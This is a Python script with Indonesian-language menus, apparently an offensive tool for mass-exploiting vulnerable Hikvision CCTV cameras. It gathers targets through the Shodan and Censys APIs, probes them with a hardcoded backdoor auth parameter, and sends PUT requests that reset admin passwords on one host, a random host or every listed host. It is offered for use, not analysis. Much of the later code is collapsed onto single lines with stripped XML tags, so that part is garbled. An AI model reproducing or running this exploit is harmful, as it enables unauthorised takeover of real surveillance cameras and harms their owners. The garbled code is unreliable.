# -*- coding: utf-8 -*-
import sys
import socket
from socket import error as socket_error
import os
import time
import shodan
import requests
import re
import subprocess
import random
import json
import censys
import censys.ipv4
from censys.base import CensysException

path = os.path.abspath(os.path.dirname(sys.argv[0]))
userID = ""
userName = ""
newPass = ""
host = open(path + '/host.txt', 'r').read().splitlines()
vuln_host = open(path + '/vuln_host.txt', 'r').read().splitlines()
BackdoorAuthArg = "auth=YWRtaW46MTEK"

def tampilkan_petunjuk():
    print(""" ____  ____   _   __                       __           _   _    
|_   ||   _| (_) [  |  _                  [  |         (_) / |_  
  | |__| |   __   | | / ]  _   __  _ .--.  | |  .--.   __ `| |-' 
  |  __  |  [  |  | '' <  [ \ [  ][ '/'`\ \| |/ .'`\ \[  | | |   
 _| |  | |_  | |  | |`\ \  > '  <  | \__/ || || \__. | | | | |,  
|____||____|[___][__|  \_][__]`\_] | ;.__/[___]'.__.' [___]\__/  
                                  [__|                           """)
    print("""+------------------------------------------------------------+
|     eksploitasi semua CCTV yang rentan dari Hikvision     |
|------------------------------------------------------------|
| Penggunaan:                                                |
| 1. Kumpulkan host dengan shodan (memerlukan API)          |
| 2. Kumpulkan host dengan censys.io (memerlukan API)       |
| 3. Pindai host yang aktif                                  |
| 4. Pindai host yang rentan                                |
| 5. Eksploitasi semua CCTV yang rentan                    |
| 6. Pilih IP CCTV tertentu untuk dieksploitasi             |
| 7. Eksploitasi CCTV acak dari daftar yang rentan          |
| 8. Instal dependensi                                      |
+------------------------------------------------------------+""")

def kumpulkan_host_shodan():
    api_shodan_key = open(path + "/api.txt", "r").read()
    if api_shodan_key == "":
        print('tidak ditemukan API Shodan yang valid, silakan masukkan yang valid')
        api_shodan_key_to_file = input('\ntulis di sini:')
        with open(path + "/api.txt", "wb") as api:
            api.write(api_shodan_key_to_file)
        api = shodan.Shodan(api_shodan_key_to_file)
    else:
        api = shodan.Shodan(api_shodan_key)
        try:
            query = input("["+ "*"+"]"+" masukkan query Shodan yang valid:")
            response = api.search(query)
            with open(path + '/host.txt', "wb") as host_file:
                for service in response['matches']:
                    host_file.write(service['ip_str'] + ":" + str(service['port']))
                    host_file.write("\n")
        except KeyboardInterrupt:
            print("\n[---] keluar sekarang [---]")

def kumpulkan_host_censys():
    censys_list = open(path + "/censys_api.txt", "r").read().splitlines()
    if censys_list == []:
        print('tidak ditemukan API Censys yang valid, silakan masukkan yang valid')
        api_censys_uid = input('[****] tulis di sini uid:')
        api_censys_scrt = input('[****] tulis di sini secret:')
        with open(path + "/censys_api.txt", "wb") as api:
            api.write(api_censys_uid + "\n" + api_censys_scrt)
    else:
        uid = censys_list[0]
        secret = censys_list[1]
        query = input('[' + '+' + ']' + ' masukkan query Censys yang valid:')
        try:
            for record in censys.ipv4.CensysIPv4(api_id=uid, api_secret=secret).search(query):
                ip = record['ip']
                port = record['protocols']
                port_raw = port[0]
                port = re.findall(r'\d+', port_raw)
                with open(path + '/host.txt', "a") as cen:
                    cen.write(ip + ":" + str(port[0]))
                    cen.write("\n")
        except CensysException:
            pass

def eksploitasi_massal():
    # SANGAT BERBAHAYA
    global target_host
    global port
    pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
    pattern_2 = r'(\:).*'
    a = 0
    while a < len(host):
        res = host[a]
        match1 = re.search(pattern_1, res)
        match2 = re.search(pattern_2, res)
        target_host = match1.group()
        port_raw = match2.group()
        port = port_raw[1:]
        newPass = "12345admin"
        userID = "1"
        userName = "admin"
        userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">'
        userXML += '<id>' + userID + '</id>'
        userXML += '<userName>' + userName + '</userName>'
        userXML += '<password>' + newPass + '</password>'
        userXML += '</User>'
        URLBase = "http://" + target_host + ":" + str(port) + "/"
        URLUpload = URLBase + "Security/users/1?" + BackdoorAuthArg
        x = requests.put(URLUpload, data=userXML).text
        a += 1

def pilih_host_eksploitasi():
    global target_host
    global port
    global userID
    global userName
    pattern_1 = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
    pattern_2 = r'(\:).*'
    b = 0
    while b < len(host):
        res = host[b]
        print(str(b) + ". " + host[b])
        print("\n")
        b += 1
    sel = int(input("[+] pilih nomor untuk host tertentu yang akan di-hack:"))
    res = host[sel]
    match1 = re.search(pattern_1, res)
    match2 = re.search(pattern_2, res)
    target_host = match1.group()
    port_raw = match2.group()
    port = port_raw[1:]
    URLBase = "http://" + target_host + ":" + str(port) + "/" print("[-] Password harus dimulai dengan 4 angka, saya mengaturnya untuk Anda.") rawPass = input("[] Silakan pilih password baru:") newPass = str(random.randint(1, 9)) + str(random.randint(1, 9)) + str(random.randint(1, 9)) + str(random.randint(1, 9)) + rawPass ans_1 = input("[] Apakah Anda ingin memeriksa pengguna dan ID yang ada? (y/n):") if ans_1 == "y": lista = requests.get(URLBase + "Security/users?1" + BackdoorAuthArg).text idf = "" pattern_id = r'().' find_id = re.findall('(.?)', lista, re.DOTALL) find_user = re.findall('(.+?)', lista, re.DOTALL) counter = 0 while counter < len(find_id): print('[] Ditemukan pengguna ' + find_user[counter] + ' dengan ID: ' + find_id[counter]) counter += 1 select_user = int(input("[--] Pilih satu pengguna untuk mengganti password:")) select_user = select_user - 1 userID = find_id[select_user] userName = find_user[select_user] elif ans_1 == "n": userID = "1" userName = "admin" userXML = '' userXML += '' + userID + '' userXML += '' + userName + '' userXML += '' + newPass + '' userXML += '' URLUpload = URLBase + "Security/users/1?" + BackdoorAuthArg a = requests.put(URLUpload, data=userXML) if a.status_code == 200: print('\n[ok] Password ' + userName + ' telah diubah menjadi ' + newPass + ' di ' + res + "\n") elif a.status_code != 200: print('[' + '' + ']' + ' Terjadi kesalahan!')def eksploitasi_host_acak(): global target_host global port global userID global userName pattern_1 = r'\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}' pattern_2 = r'(:).' b = 0 while b < len(host): res = host[b] print(str(b) + ". " + host[b]) print("\n") b += 1 op = len(host) - 1 sel = random.randint(1, op) print("[--] Terpilih Nomor " + str(sel)) res = host[sel] match1 = re.search(pattern_1, res) match2 = re.search(pattern_2, res) target_host = match1.group() port_raw = match2.group() port = port_raw[1:] URLBase = "http://" + target_host + ":" + str(port) + "/" print("[-] Password harus dimulai dengan 4 angka, saya mengaturnya untuk Anda.") rawPass = input("[] Silakan pilih password baru:") newPass = str(random.randint(1, 9)) + str(random.randint(1, 9)) + str(random.randint(1, 9)) + str(random.randint(1, 9)) + rawPass ans_1 = input("[] Apakah Anda ingin memeriksa pengguna dan ID yang ada? (y/n):") if ans_1 == "y": lista = requests.get(URLBase + "Security/users?1" + BackdoorAuthArg).text idf = "" pattern_id = r'().' find_id = re.findall('(.?)', lista, re.DOTALL) find_user = re.findall('(.+?)', lista, re.DOTALL) counter = 0 while counter < len(find_id): print('[' + '' + ']' + ' Ditemukan pengguna ' + find_user[counter] + ' dengan ID: ' + find_id[counter]) counter += 1 select_user = int(input("[--] Pilih satu pengguna untuk mengganti password:")) select_user = select_user - 1 userID = find_id[select_user] userName = find_user[select_user] elif ans_1 == "n": userID = "1" userName = "admin" userXML = '' userXML += '' + userID + '' userXML += '' + userName + '' userXML += '' + newPass + '' userXML += '' URLUpload = URLBase + "Security/users/1?" + BackdoorAuthArg a = requests.put(URLUpload, data=userXML) if a.status_code == 200: print('\n[ok] Password ' + userName + ' telah diubah menjadi ' + newPass + ' di ' + res + "\n") elif a.status_code != 200: print('[' + '*' + ']' + ' Terjadi kesalahan!') print(a)def pindai_rentan(): print("[+] Memuat semua host...") a = 0 try: while a < len(host): global target_host global port pattern_1 = r'\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}' pattern_2 = r'(:).*' res = host[a] match1 = re.search(pattern_1, res) match2 = re.search(pattern_2, res) target_host = match1.group() port_raw = match2.group() port = port_raw[1:] try: client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) client.settimeout(5) client.connect((target_host, int(port))) client.send("GET /HTTP/1.1\r\nHost: google.com\r\n\r\n") response = client.recv(4096) x = True except socket_error: x = False except KeyboardInterrupt: print("\n[---] keluar sekarang [---]") if x: with open(path + '/vuln_host.txt', "a") as host_up: host_up.write(target_host + ":" + port + "\n") elif not x: passa += 1
    except KeyboardInterrupt:
    print("\n[---] keluar sekarang [---[---]")def pindai_dan_eksploitasi_rentan(): os.system("rm -rf " + path + "/host.txt") open(path + '/host.txt', 'w') p = 0 while p < len(vuln_host): ip_to_check = vuln_host[p] try: response = requests.get('http://' + ip_to_check + '/security/users/1?' + BackdoorAuthArg) if response.status_code == 200: with open(path + '/host.txt', 'a') as host_vuln: host_vuln.write(ip_to_check + "\n") elif response.status_code == 401: pass elif response.status_code == 404: pass p += 1 except requests.exceptions.ConnectionError: pass p += 1def lakukan_pindai(): pindai_rentan() # pindai_dan_eksploitasi_rentan()def pasang_dependensi(): install = input('[' + '*' + ']' + ' Apakah Anda ingin memasang dependensi? (y/n)') if install == "y": os.system('pip install shodan') os.system('pip install censys') tampilkan_petunjuk() tanggapan() elif install == "n": tampilkan_petunjuk() tanggapan()def tanggapan(): tampilkan_petunjuk() try: pilihan = input('[' + '#' + ']' + ' Pilih opsi:') if str(pilihan) == "1": kumpulkan_host_shodan() tanggapan() elif str(pilihan) == "2": kumpulkan_host_censys() tanggapan() elif str(pilihan) == "3": lakukan_pindai() tanggapan() elif str(pilihan) == "4": pindai_dan_eksploitasi_rentan() tanggapan() elif str(pilihan) == "5": print('[' + '!!!' + ']' + ' Opsi sangat berbahaya, harap berhati-hati') jawaban = input('[' + '???' + ']' + ' Apakah Anda ingin melanjutkan? [y/n]') if str(jawaban) == "y": eksploitasi_massal() tanggapan() elif str(jawaban) == "n": tanggapan() elif str(pilihan) == "6": pilih_host_eksploitasi() tanggapan() elif str(pilihan) == "7": eksploitasi_host_acak() tanggapan() elif str(pilihan) == "8": pasang_dependensi() elif str(pilihan) == "help": tampilkan_petunjuk() elif str(pilihan) == "exit": exit() else: print("Pilihan tidak valid! Masukkan nomor yang valid.") tanggapan() except KeyboardInterrupt: print("\n[---] keluar sekarang [---]")def main(): try: tanggapan() except KeyboardInterrupt: print("\n[---] keluar sekarang [---]")main()